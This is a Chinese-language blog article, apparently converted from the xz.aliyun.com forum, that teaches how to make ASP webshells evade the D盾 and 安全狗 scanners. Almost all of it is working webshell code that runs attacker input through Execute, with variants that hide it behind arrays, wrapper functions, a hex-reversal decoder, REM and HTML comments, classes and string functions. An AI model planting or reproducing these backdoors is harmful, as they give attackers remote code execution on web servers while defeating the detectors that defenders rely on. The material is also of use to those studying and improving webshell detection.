> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [xz.aliyun.com](https://xz.aliyun.com/t/5193)

现在 asp 不多但是还是有，还是写一篇文章来简单的介绍下 asp 的免杀吧，相对于 php 我们的 asp 还是不够灵活, 其中一些思路参考于 LandGrey 的文章

偷偷介绍下公众号：404 安全

1.  数组
2.  函数
3.  加密
4.  注释符
5.  类
6.  字符串操作

ASP 解释器还有：VBScript

ASP 的注释符号 ： `' 、 REM` 当然如果你使用 vbscript 注释还有`<!-- --> 和//`

ASP 的执行函数 : Eval 、 Execute 、ExecuteGlobal

利用数组来免杀，因为我们在 php 免杀中使用过数组，他的效果还不错，那么我们是否可以利用到 asp 来，当然答案是肯定的

其中定义数组的方法有多种方式，我们才用最简单方式来看看

```
<%
dim a(5)
a(0)=request("404")
eXecUTe(a(0))
%>
```

简单的数组定义 D 盾就不认识了，为什么我会想到用数组来绕过，因为我发现函数调用的时候 D 盾不敏感，包括 asp，php 等

当然你还可以这样用，加上一点循环语句

```
<%
  dim array(1)
  dim c
  array(1)=request("404")
  for each a in array
    c = a & ""
  next
  execute(c)
%>
```

这个是那天 D 盾更新，无意间测试出来的，发现 d 盾对函数传入不是很敏感

```
<%

Function b():
    b = request("404")
End Function


Function f():
    eXecUTe(b())
End Function
f()

%>
```

网上随便找了一段加密算法 但是测试发现 D 盾爆了一级，参数未知

```
<%
eXecUTe(gw_jiemi("920022008400D4002200820047003700560057001700560027000200C60016006700560077007600"))
function gw_jiemi(text)
    const key="gw"
    dim str : str=text
    dim str1
    dim str2 : str2=strreverse(str) 
    for i=1 to len(str2) step 4
        str1=str1 & ChrW(cint("&H" & mid(str2,i,4)))
    next
    gw_jiemi=mid(str1,len(key)+1,len(str)-len(key))
end function
%>
```

既然都提示我们参数的问题了，那么简单的干扰一下吧, 连接个空字符

```
<%
eXecUTe(gw_jiemi("920022008400D4002200820047003700560057001700560027000200C60016006700560077007600")&"")
function gw_jiemi(text)
    const key="gw"
    dim str : str=text
    dim str1
    dim str2 : str2=strreverse(str) 
    for i=1 to len(str2) step 4
        str1=str1 & ChrW(cint("&H" & mid(str2,i,4)))
    next
    gw_jiemi=mid(str1,len(key)+1,len(str)-len(key))
end function
%>
```

解密的算法是

```
function gw_jiami(text)
    const key="gw"
    dim str : str=key & text 
    dim str1
    dim str2
    for i=1 to len(str)
        str2=hex(AscW(mid(str,i,1)))
        for j=1 to 4-len(str2)
            str2="0" & str2
        next
        str1=str1 & str2
    next
    gw_jiami=strreverse(str1)
end function
```

通过一个简单的注释符绕过安全狗还是比较简单的,

```
<%
    a = request("404")
    b = a REM a
    execute(b)
%>
```

怎么绕过 d 盾了想了几分钟发现可以这样

```
<%
<!--
    a = request("404")
    execute(a)
-->
%>
```

在 php 中我们使用类可以很轻松的绕过，但是 asp 使用类现在 d 盾看的很紧，首先看看最简单的类

```
<%

Class LandGrey
  Private Sub Class_Initialize
    execute request("404")
  End Sub
End Class

Set X = New LandGrey

%>
```

利用 Class_Initialize 初始化就调用我们的函数，但是已经不行了，那么我们简单的变形一下

```
<%
Class LandGrey
    private str_title

    public property let setauthor(str)
    execute str REM a
    end property
End Class

Set a= New LandGrey
a.setauthor= request("404")
%>
```

这个 D 盾爆出一级，提示未知参数 str，怎么绕过呢，我们可以用函数的方式把他包裹起来 跟前面方案一样

```
<%
Class LandGrey
    private str_title

    public property let setauthor(str)
    execute(str&"")
    end property
End Class

Set a= New LandGrey
a.setauthor= request("404")
%>
```

但是提示语句没结束语法问题，那就改改，用括号包裹起来调用，同时利用 REM 注释后面的内容，d 盾就会识别括号里面有内容，从而绕过

```
<%
Class LandGrey
    private str_title

    public property let setauthor(str)
    execute(str )REM a)
    end property
End Class

Set a= New LandGrey
a.setauthor= request("404")
%>
```

前面说过他提示的参数没 赋值 那么我们就定义一个局部变量来赋值吧

```
<%
Class LandGrey

private str
    Private Sub Class_Initialize
    str = ""
    End Sub
    public property let setauthor(str)
    execute(str)
    end property

End Class

Set a= New LandGrey
a.setauthor= request("404")
%>
```

前面 php 的 webshell 我们讲过，d 盾是杀参数的，我们如何绕过的思路就是在传入参数这里做文章，先来一个简单的

```
<%
a = request("404")
b = Left(a,99999)
execute(b)
%>
```

D 盾直接爆 4 级，我们再找个函数包裹一下我们的 a 字符串, UCase 大小写转换

```
<%
a = request("404")
b = Left(UCase(a),99999)
execute(b)
%>
```

还是 4 级，那么我们在后面连接一个空格呢, 那么他就能完美绕过

```
<%
a = request("404")
b = Left(UCase(a)&"",99999)
execute(b)
%>
```

虽然 asp 不是很灵活，但是通过探索还是能发现不少姿势，还是那句话多学多练，我们一起从 0 开始

参考:  
[https://xz.aliyun.com/t/2356](https://xz.aliyun.com/t/2356)